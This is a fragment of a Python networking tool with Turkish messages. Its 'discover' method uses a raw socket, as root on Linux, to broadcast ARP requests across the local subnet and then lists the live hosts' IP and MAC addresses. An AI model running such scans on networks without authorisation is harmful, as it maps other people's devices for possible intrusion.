        for s in (self._sock, self._send):
            try:
                if s:
                    s.close()
            except OSError:
                pass
        self._sock = self._send = None

    # ------------------------------------------------------------ keşif
    def discover(self, iface, wait=1.6, limit=512):
        if not sys.platform.startswith('linux') or os.geteuid() != 0:
            return {'ok': False, 'error': 'Keşif için Linux ve root gerekir.'}
        info = iface_info(iface)
        if not info['mac'] or not info['ip']:
            return {'ok': False, 'error': 'Arayüz bilgisi okunamadı.'}
        try:
            net = ipaddress.IPv4Network('%s/%s' % (info['ip'], info['mask'] or '255.255.255.0'), strict=False)
        except Exception:
            return {'ok': False, 'error': 'Alt ağ hesaplanamadı.'}
        try:
            sock = self._open_socket(iface)
        except OSError as e:
            return {'ok': False, 'error': 'Soket açılamadı: %s' % e}
        try:
            hosts = [str(h) for h in net.hosts()][:limit]
            for _ in range(2):
                for ip in hosts:
                    try:
                        sock.send(arp_request(b'\xff' * 6, mac_bytes(info['mac']), info['ip'], ip))
                    except OSError:
                        break
                time.sleep(wait / 2)
            table = arp_table()
            found = []
            for ip in hosts:
                if ip in table:
                    found.append({'ip': ip, 'mac': table[ip]})
            return {'ok': True, 'subnet': str(net), 'found': found}
        finally:
            try:
                sock.close()
            except OSError:
                pass


def _valid_ip(s):
    try:
        ipaddress.IPv4Address(s)
        return True
    except Exception:
        return False


PT = Ptentes()
